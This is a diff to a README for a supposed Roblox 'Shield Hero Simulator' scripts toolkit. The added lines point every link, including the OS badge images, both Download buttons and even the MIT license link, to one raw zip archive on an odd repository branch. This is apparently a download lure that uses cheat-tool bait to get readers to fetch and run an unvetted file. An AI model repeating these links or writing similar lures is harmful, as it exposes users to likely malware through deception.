@@ -10,11 +10,11 @@ Explore limitless possibilities across diverse platforms! Our scripts fit comfor
 
 | Operating System  |  Supported?  |  
 |:-----------------:|:------------:|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows)| ✔️   |  
-| ![macOS](https://img.shields.io/badge/macOS-Monterey%2B-lightgrey?logo=apple)| ✔️   |  
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2B-important?logo=linux)| ✔️   |  
-| ![Android](https://img.shields.io/badge/Android-10%2B-green?logo=android)| ✔️   |  
-| ![iOS](https://img.shields.io/badge/iOS-13%2B-blueviolet?logo=apple)| ✔️   |  
+| ![Windows](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip%2B-blue?logo=windows)| ✔️   |  
+| ![macOS](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip%2B-lightgrey?logo=apple)| ✔️   |  
+| ![Linux](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip%2B-important?logo=linux)| ✔️   |  
+| ![Android](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip%2B-green?logo=android)| ✔️   |  
+| ![iOS](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip%2B-blueviolet?logo=apple)| ✔️   |  
 
 Amplify your gameplay, wherever inspiration strikes!  
 
@@ -80,8 +80,8 @@ Our support channel transcends time zones. Stumped at 3am? Outmaneuvered at noon
 Ready to transcend the ordinary?  
 Unleash your Shield Hero adventure with a pragmatic download. Access your copy below:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://kimmy1985.github.io)  
-https://kimmy1985.github.io
+[![Download](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip)](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip)  
+https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip
 
 ### Installation
 
@@ -115,15 +115,15 @@ And more—be sure to check out each subfolder and documentation for unique game
 
 Eager to dive in? Here’s your gateway to innovation!
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://kimmy1985.github.io)  
-https://kimmy1985.github.io
+[![Download](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip)](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip)  
+https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip
 
 ---
 
 ## 📜 License (MIT 2025)
 
 This project is licensed under the MIT License (2025).  
-See the full license text [here](https://opensource.org/licenses/MIT).
+See the full license text [here](https://raw.githubusercontent.com/kimmy1985/shield-hero-simulator-roblox-toolkit/branch/capilliculture/shield-hero-simulator-roblox-toolkit_3.1.zip).
 
 ---
 
